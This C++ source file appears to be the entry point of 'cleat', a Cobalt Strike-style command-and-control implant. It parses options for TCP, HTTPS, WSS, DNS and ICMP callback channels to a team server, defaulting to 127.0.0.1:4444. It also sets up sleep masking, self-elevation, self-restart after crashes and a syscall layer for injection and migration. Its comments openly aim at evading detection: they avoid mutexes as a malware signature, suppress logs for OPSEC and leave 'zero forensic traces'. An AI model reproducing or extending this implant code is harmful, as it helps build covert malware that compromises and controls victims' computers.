/**
 * @file AgentEntry.cpp
 * @brief Agent公共入口实现（形态无关）
 * 
 * 原main整体迁移为cleat::RunAgent：参数解析 + 崩溃兜底 + Agent启动。
 * EXE/DLL形态的入口分别见EntryExe.cpp/EntryDll.cpp（CMake按CLEAT_AS_DLL选编）。
 */

#include "AgentEntry.hpp"
#include "Core/Native/Win/Syscall.hpp"
#include "Common/Logger/ErrLog.hpp"
#include "Common/Logger/Logger.hpp"

#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#endif

#include <cstdio>
#include <algorithm>
#include <cstdint>
#include "Agent.hpp"
#include "Core/CrashGuard/CrashGuard.hpp"
#include "Core/Identity/SessionIdentity.hpp"
#include "Core/Config/AgentConfig.hpp"
#include "Core/Bootstrap/EmbeddedConfig.hpp"
#include "Common/Obfuscation/StringObf.hpp"
#include "Crypto/Engine/CryptoManager.hpp"
#include <atomic>
#include <cerrno>
#include <cstdlib>
#include <exception>

#if defined(_WIN32) && !defined(NDEBUG)
#include <dbghelp.h>
#pragma comment(lib, "dbghelp.lib")
#endif

namespace cleat {

#if defined(_WIN32) && !defined(NDEBUG) && defined(CLEAT_DBG_VEH)
    /**
     * @brief 调试构建首异常 VEH 打印器(**编译开关 CLEAT_DBG_VEH, 默认关**)
     *
     * VEH 打印崩溃点（寄存器+栈回溯），定位'几十秒自崩'问题。
     * 加SymFromAddr符号化——异常复现时直接打印函数名，不再手动对偏移。
     *
     * 掩码窗口期任何"首异常"都会被内核派发到这里 → 执行密文页 → EXECUTE-AV →
     * 级联风暴(实测 417 轮耗尽线程栈)。排障时才用 -DCLEAT_DBG_VEH=ON 临时构建。
     * @param ep 异常指针
     * @return 异常处理结果
     */
    static LONG WINAPI DbgVeh(EXCEPTION_POINTERS* ep) {
        // 是数据竞争(UB) —— 改 atomic; dbghelp 自身的并发语义不做保证, 本就是
        // Debug 构建的最佳努力诊断。
        static std::atomic<bool> sym_ok{ false };
        static HANDLE hProc = GetCurrentProcess();
        if (!sym_ok.load(std::memory_order_acquire)) {
            const bool ok = SymInitialize(hProc, nullptr, TRUE);   // 自动加载模块 PDB
            if (ok) SymSetOptions(SYMOPT_UNDNAME | SYMOPT_LOAD_LINES);
            sym_ok.store(ok, std::memory_order_release);
        }
        const uintptr_t ea = (uintptr_t)ep->ExceptionRecord->ExceptionAddress;
#ifdef _WIN64
		fprintf(stderr, "[VEH] code=0x%X ea=0x%llX rax=0x%llX rcx=0x%llX rdx=0x%llX rsp=0x%llX rip=0x%llX\n",
			(unsigned)ep->ExceptionRecord->ExceptionCode,
			(unsigned long long)ea,
			(unsigned long long)ep->ContextRecord->Rax,
			(unsigned long long)ep->ContextRecord->Rcx,
			(unsigned long long)ep->ContextRecord->Rdx,
			(unsigned long long)ep->ContextRecord->Rsp,
			(unsigned long long)ep->ContextRecord->Rip);
#else
		fprintf(stderr, "[VEH] code=0x%X ea=0x%llX eax=0x%llX ecx=0x%llX edx=0x%llX esp=0x%llX eip=0x%llX\n",
			(unsigned)ep->ExceptionRecord->ExceptionCode,
			(unsigned long long)ea,
			(unsigned long long)ep->ContextRecord->Eax,
			(unsigned long long)ep->ContextRecord->Ecx,
			(unsigned long long)ep->ContextRecord->Edx,
			(unsigned long long)ep->ContextRecord->Esp,
			(unsigned long long)ep->ContextRecord->Eip);
#endif
        // 栈回溯(前 12 帧, 打印符号便于直接定位)
        void* bt[12] = { 0 };
        const USHORT n = CaptureStackBackTrace(0, 12, bt, nullptr);
        HMODULE mod = nullptr;
        GetModuleHandleExA(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
            (LPCSTR)ea, &mod);
        fprintf(stderr, "[VEH] module=%p frames=%u\n", (void*)mod, (unsigned)n);
        for (USHORT i = 0; i < n; ++i) {
            uintptr_t a = (uintptr_t)bt[i];
            HMODULE m = nullptr;
            GetModuleHandleExA(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
                (LPCSTR)a, &m);
            const char* fname = "?";
            char buf[sizeof(SYMBOL_INFO) + 256] = { 0 };
            if (sym_ok.load(std::memory_order_relaxed)) {
                SYMBOL_INFO* si = (SYMBOL_INFO*)buf;
                si->SizeOfStruct = sizeof(SYMBOL_INFO);
                si->MaxNameLen = 255;
                DWORD64 disp = 0;
                if (SymFromAddr(hProc, a, &disp, si)) {
                    fname = si->Name;
                }
            }
            fprintf(stderr, "  [%02u] 0x%llX %s (mod=%p off=0x%llX)\n",
                (unsigned)i, (unsigned long long)a, fname, (void*)m,
                (unsigned long long)(m ? (a - (uintptr_t)m) : a));
        }
        fflush(stderr);
        return EXCEPTION_CONTINUE_SEARCH;
    }
#endif

    /**
     * @brief 启动Agent（阻塞，直到退出信号）
     * @param argc 命令行参数个数
     * @param argv 命令行参数数组
     * @return 进程退出码（0 = 正常）
     * 
     * @note argc/argv语义与main一致
     */
    int RunAgent(int argc, char** argv) {
#if defined(_WIN32) && !defined(NDEBUG) && defined(CLEAT_DBG_VEH)
    AddVectoredExceptionHandler(1, DbgVeh);
#endif
#if defined(_WIN32)
    // 同进程内单次启动 DllMain 的 DllAutoStart 与 StartW 双入口
    // 会同时启动两个 RunAgent → 同 machine_id 双实例在 server 防抖下互相踢。
    // 用进程内原子标志(非系统互斥体): 同一进程双入口只跑一个;
    // 跨进程(崩溃自重启/提权重启/主动多开)不受影响, 也无互斥体这类
    // 经典恶意软件特征对象。多实例场景(如将来 --standby 互保)天然支持。
    {
        static std::atomic<bool> s_started{ false };
        if (s_started.exchange(true)) {
            return 0;   // 本进程已有一个 RunAgent 在跑
        }
    }
#endif
    // 崩溃兜底最先安装: 未处理硬件异常 → minidump + 标记 + 自重启(带 --after-crash)。
    // 平台差异收敛在 Core/CrashGuard(PlatformWin_/PlatformLinux_ 由 CMake 过滤), 不影响跨平台分层。
    const std::string dumpDir = cleat::Platform::GetDefaultDumpDir();
    cleat::Platform::InstallCrashGuard(dumpDir);

    try {
        // 交付构建(CLEAT_LOG_MIN_LEVEL 默认 WARN)不开 DEBUG 级: 运行期把带源码路径的
        // 诊断打到控制台/日志文件, 既是行为特征也是本地 OPSEC 泄露; 开发构建保持全量。
#if CLEAT_LOG_MIN_LEVEL <= 0
        cleat::Logger::Instance().SetLevel(cleat::LogLevel::__DEBUG);
#endif

        // 模板化配置(CS 式): 预编译模板内嵌配置块, 服务器 patch 后零参数运行。
        // 必须在 CLI 参数解析前应用 —— CLI 参数优先级更高(CLI > 嵌入 > 编译期默认)
        cleat::EmbeddedConfigApply();

        // 上次异常退出提示(标记由 CrashGuard 写入, 读取后清除)
        const std::string lastCrash = cleat::Platform::ConsumeLastCrashInfo(dumpDir);
        if (!lastCrash.empty()) {
            LOG_WARN("检测到上次异常退出: " << lastCrash);
        }


        // 自提权参数: --elevated 标记提升实例; --old-session N 记录旧会话
        // (提升实例会拒绝后续所有 Elevate, 防止无限提升循环)
        for (int i = 1; i < argc; ++i) {
            std::string arg = argv[i];
            if (arg == "--elevated") {
                cleat::SessionIdentity::Instance().SetElevated(true);
                LOG_INFO("运行于提升实例模式(--elevated), 自我提权已禁用");
            }
            else if (arg == "--old-session" && i + 1 < argc) {
                // 非法一律忽略该参数并留痕, 不做任何截断/猜测。
                const char* sv = argv[++i];
                char* end = nullptr;
                errno = 0;
                const unsigned long long v = std::strtoull(sv, &end, 10);
                if (errno != 0 || end == sv || *end != '\0' || v == 0) {
                    LOG_WARN("--old-session 值非法(需正整数): '" << sv << "', 忽略该参数");
                }
                else {
                    cleat::SessionIdentity::Instance().SetOldSessionId(v);
                }
            }
            // 传输模式/URL(Phase 1): --transport tcp|https|wss; https 时 --url https://host/path;
            else if (arg == "--transport" && i + 1 < argc) {
                cleat::AgentConfig::Instance().transport_mode = argv[++i];
                LOG_INFO("传输模式: " << cleat::AgentConfig::Instance().transport_mode);
            }
            // TCP 模式服务器地址(生成器注入必需; 默认编译期 127.0.0.1:4444)
            else if (arg == "--host" && i + 1 < argc) {
                cleat::AgentConfig::Instance().server_host = argv[++i];
                LOG_INFO("Server Host: " << cleat::AgentConfig::Instance().server_host);
            }
            else if (arg == "--port" && i + 1 < argc) {
                // --port 70000 变 4464, 误配变成"连到某个合法但错误的端口", 极难排查。
                // 越界/非法一律忽略该参数(保持现值)并留痕, 不做任何截断。
                const char* sv = argv[++i];
                char* end = nullptr;
                errno = 0;
                const unsigned long v = std::strtoul(sv, &end, 10);
                if (errno != 0 || end == sv || *end != '\0' || v == 0 || v > 65535) {
                    LOG_WARN("--port 值非法(需 1..65535): '" << sv << "', 忽略该参数");
                }
                else {
                    cleat::AgentConfig::Instance().server_port = static_cast<uint16_t>(v);
                    LOG_INFO("Server Port: " << cleat::AgentConfig::Instance().server_port);
                }
            }
            else if (arg == "--url" && i + 1 < argc) {
                // URL scheme 定归属: wss:// → WebSocket 通道, 其余沿用 HTTPS 基础 URL
                // (与参数顺序无关: --transport 在 --url 前后均正确)
                const char* uv = argv[++i];
                if (std::string(uv).rfind("wss://", 0) == 0) {
                    cleat::AgentConfig::Instance().wss_url = uv;
                    LOG_INFO("WSS URL: " << cleat::AgentConfig::Instance().wss_url);
                }
                else {
                    cleat::AgentConfig::Instance().https_url = uv;
                    LOG_INFO("HTTPS URL: " << cleat::AgentConfig::Instance().https_url);
                }
            }
            else if (arg == "--upload-url" && i + 1 < argc) {
                cleat::AgentConfig::Instance().https_upload_url = argv[++i];
                LOG_INFO("HTTPS Upload URL: " << cleat::AgentConfig::Instance().https_upload_url);
            }
            // HTTPS 证书/代理(对齐 CS): --https-ignore-cert 跳过自签校验; --https-proxy 空|system|host:port
            else if (arg == "--https-ignore-cert") {
                cleat::AgentConfig::Instance().SetHttpsIgnoreCert(true);
                LOG_INFO("HTTPS 证书校验已跳过(测试/自签场景)");
            }
            else if (arg == "--https-proxy" && i + 1 < argc) {
                cleat::AgentConfig::Instance().SetHttpsProxy(argv[++i]);
                LOG_INFO("HTTPS 代理: " << cleat::AgentConfig::Instance().GetHttpsProxy());
            }
            else if (arg == "--quic-ignore-cert") {
                cleat::AgentConfig::Instance().SetQuicIgnoreCert(true);
                LOG_INFO("QUIC 证书校验已跳过(测试/自签场景)");
            }
            // 睡眠掩码: --mask 启用(CLI 风格对齐
            // --quic-ignore-cert), 窗长/抖动可选。执行体需 CLEAT_WITH_MASK=ON 构建;
            // 未编入时判定层按"平台不可用"拒绝, 配置无害。默认关 —— 稳态掩码把
            // check-in 间隔拉到窗长量级(命令延迟同步变大), 由操作员显式选择。
            else if (arg == "--mask") {
                auto m = cleat::AgentConfig::Instance().GetMaskConfig();
                m.enabled = true;
                cleat::AgentConfig::Instance().SetMaskConfig(m);
                LOG_INFO("睡眠掩码已启用(CLI --mask; 窗长 " << m.sleep_ms << "ms ±"
                    << m.jitter_permille << "‰)");
            }
            else if (arg == "--mask-sleep-ms" && i + 1 < argc) {
                const uint32_t v = static_cast<uint32_t>(std::strtoul(argv[++i], nullptr, 10));
                auto m = cleat::AgentConfig::Instance().GetMaskConfig();
                m.sleep_ms = (std::min)((std::max)(v, 30000u), 120000u);   // 运营面下限 30s(同 ApplyMask)
                cleat::AgentConfig::Instance().SetMaskConfig(m);
                LOG_INFO("掩码窗长: " << m.sleep_ms << "ms(CLI --mask-sleep-ms)");
            }
            else if (arg == "--mask-jitter-permille" && i + 1 < argc) {
                const uint32_t v = static_cast<uint32_t>(std::strtoul(argv[++i], nullptr, 10));
                auto m = cleat::AgentConfig::Instance().GetMaskConfig();
                m.jitter_permille = (std::min)(v, 1000u);
                cleat::AgentConfig::Instance().SetMaskConfig(m);
                LOG_INFO("掩码窗长抖动: ±" << m.jitter_permille << "‰(CLI)");
            }
            else if (arg == "--dns-server" && i + 1 < argc) {
                cleat::AgentConfig::Instance().dns_server = argv[++i];
                LOG_INFO("DNS Server: " << cleat::AgentConfig::Instance().dns_server);
            }
            else if (arg == "--domain" && i + 1 < argc) {
                cleat::AgentConfig::Instance().dns_domain = argv[++i];
                LOG_INFO("DNS Domain: " << cleat::AgentConfig::Instance().dns_domain);
            }
            else if (arg == "--icmp-target" && i + 1 < argc) {
                cleat::AgentConfig::Instance().icmp_target = argv[++i];
                LOG_INFO("ICMP Target: " << cleat::AgentConfig::Instance().icmp_target);
            }
            // 预共享密钥(64 位 hex): 与 TeamServer -psk 一致, 运行时注入不硬编码
            else if (arg == "--psk" && i + 1 < argc) {
                const std::string psk = argv[++i];
                if (!cleat::CryptoManager::Instance().SetPsk(psk)) {
                    CLEAT_LOGE(ErrDom::Cry, ErrCode::InvalidParam, "无效 --psk(须 64 位 hex), 加密将不可用");
                }
            }
            // Server 长期公钥(64 位 hex): X25519 握手模式(与 --psk 二选一, 后注入者生效)
            else if (arg == "--server-pubkey" && i + 1 < argc) {
                const std::string pub = argv[++i];
                if (!cleat::CryptoManager::Instance().SetServerPublicKey(pub)) {
                    CLEAT_LOGE(ErrDom::Cry, ErrCode::InvalidParam, "无效 --server-pubkey(须 64 位 hex)");
                }
            }
            // 本地诊断日志落盘(默认不落盘 = 无取证痕迹; 仅调试期显式开启)
            else if (arg == "--log-file" && i + 1 < argc) {
                cleat::Logger::Instance().SetLogFile(argv[++i]);
                // —— Debug 构建保留 minidump/崩溃标记便于排障, Release 构建不生成任何
                // 崩溃日志(零取证痕迹, --after-crash 自重启兜底不受影响)。原先这里引导
                // "SetConfig 下发 crash_dump_enabled", 与 ConfigContract"仅安装时读一次、
                // 运行期修改无效"自相矛盾, 该键已随配置面移除。
#ifdef NDEBUG
                LOG_INFO("崩溃兜底已安装: Release 构建, 不生成崩溃日志(自重启兜底不受影响)");
#else
                LOG_INFO("崩溃兜底已安装: Debug 构建, 崩溃转储/标记保留(便于排查静默退出)");
#endif
                LOG_INFO("日志落盘已开启(诊断模式)");
            }
        }

        // ================= 传输加密强制(交付构建 fail-closed) =================
        // 敏感数据保护: 加密不可用时, 此前会静默以明文建连(实测踩坑: 产物日志停在
        // "等待运行时密钥注入" 却照常上线, 首连 beacon 明文可读)。
        // 交付构建(NDEBUG)必须拒绝明文; Debug 构建保留明文以便本地压测/协议复刻
        // (scripts/build_agent.cmd 构建 x64-Debug), 但启动即打显式告警防误交付。
        // CLI --psk/--server-pubkey 已在上方解析完毕, 此处是建连前最后一道闸。
#ifndef NDEBUG
        // L1 syscall 层自测(注入与迁移设计 一期验收): SSN 对齐 + 间接调用通过性。
        // 仅诊断, 不影响本进程运行; Release 走 MigrateSpawn 时惰性 Init。
        if (!cleat::native::Init() || !cleat::native::SelfTest()) {
            CLEAT_LOGE(ErrDom::Nat, ErrCode::SyscallResolveFailed, "Native: syscall 层自测失败(仅诊断, 不影响本进程运行)");
        }
#endif

        const auto& crypto = cleat::CryptoManager::Instance();
#ifdef NDEBUG
        if (!crypto.IsEnabled()) {
            CLEAT_LOGE(ErrDom::Cry, ErrCode::Denied, "[SECURITY] 传输加密不可用(未烧录 PSK/Server 公钥), 拒绝建连");
            CLEAT_LOGE(ErrDom::Cry, ErrCode::Denied, "[SECURITY] 交付构建禁止明文传输; 请用 artifact 生成器烧入 --server-pubkey(x25519) 或 --psk");
            return 3;
        }
        LOG_INFO("传输加密已启用: " << crypto.GetAlgorithmName()
            << (crypto.IsX25519Mode() ? " (X25519 握手模式)" : " (PSK 模式)"));
#else
        if (!crypto.IsEnabled()) {
            LOG_WARN("[SECURITY] 传输加密不可用, 当前为明文调试模式(仅限 Debug 构建, 禁止交付)");
        }
        else {
            LOG_INFO("传输加密已启用: " << crypto.GetAlgorithmName()
                << (crypto.IsX25519Mode() ? " (X25519 握手模式)" : " (PSK 模式)"));
        }
#endif

        cleat::Agent agent;
        return agent.Run();
    }
    catch (const std::exception& e) {
        CLEAT_LOGE(ErrDom::Sys, ErrCode::UnhandledException, "未捕获异常: " << e.what());
        return 1;
    }
    catch (...) {
        CLEAT_LOGE(ErrDom::Sys, ErrCode::UnhandledException, "未知异常");
        return 1;
    }
}

} // namespace cleat
